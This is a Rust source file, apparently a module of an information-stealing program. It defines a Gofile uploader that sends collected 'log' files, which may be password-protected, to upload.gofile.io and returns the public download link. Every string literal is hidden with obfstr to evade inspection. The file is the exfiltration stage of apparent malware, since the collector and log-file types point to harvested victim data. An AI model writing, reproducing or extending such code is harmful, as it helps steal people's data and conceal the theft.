use crate::external_upload::{Uploader, base_upload};
use crate::{LogFile, LogSender, SendError};
use alloc::sync::Arc;
use collector::Collector;
use delegate::delegate;
use json::parse;
use obfstr::obfstr as s;

/// https://gofile.io uploader wrapper around an inner [`LogSender`].
#[derive(Clone)]
pub struct GofileUploader<T: LogSender> {
    inner: Uploader<T>,
}

impl<T: LogSender> GofileUploader<T> {
    pub fn new(inner: T) -> Self {
        Self {
            inner: Uploader::new(s!("Gofile"), inner, upload),
        }
    }
}

fn upload(name: &str, bytes: &[u8]) -> Option<Arc<str>> {
    let response = base_upload(name, s!("https://upload.gofile.io/uploadFile"), bytes)?;

    Some(
        parse(response.body())
            .ok()?
            .get(s!("data"))?
            .get(s!("downloadPage"))?
            .as_string()?
            .clone()
            .into(),
    )
}

impl<T: LogSender> LogSender for GofileUploader<T> {
    delegate! {
        to self.inner {
            fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
            where P: AsRef<str> + Clone, C: Collector;
        }
    }
}
